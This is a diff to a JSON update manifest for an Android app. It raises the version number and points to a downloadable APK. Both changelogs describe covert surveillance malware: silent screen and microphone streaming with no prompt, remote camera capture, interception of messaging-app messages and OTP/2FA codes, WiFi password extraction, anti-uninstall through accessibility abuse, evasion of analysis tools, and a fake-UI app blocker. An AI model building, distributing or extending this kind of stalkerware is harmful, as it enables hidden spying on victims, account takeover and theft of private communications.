@@ -1,8 +1,8 @@
 {
-  "version_code": 46,
-  "version_name": "7.9.0",
+  "version_code": 47,
+  "version_name": "7.9.2",
   "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "GOD-LEVEL UPDATE: 12 new features including live screen/mic streaming, remote camera capture, VoIP call recording, WhatsApp/Telegram/Signal/Instagram message capture, OTP/2FA interception, anti-uninstall via accessibility, app blocker, WiFi password extraction, geofencing, Frida/Xposed detection, self-healing companion, network obfuscation, remote file manager, searchable transcript vault, two-way chat, multi-device dashboard, webhook integrations (Telegram/Discord).",
+  "changelog": "FIXED: Live screen viewer (silent, no prompt), live mic player (Web Audio API real-time), camera gallery, file manager (offline cache), apps list (shows ALL user apps via <queries>), app blocker v2 (fake UI: update page/contact/call/timer/redirect), remote uninstall, blocked apps unblock list.",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
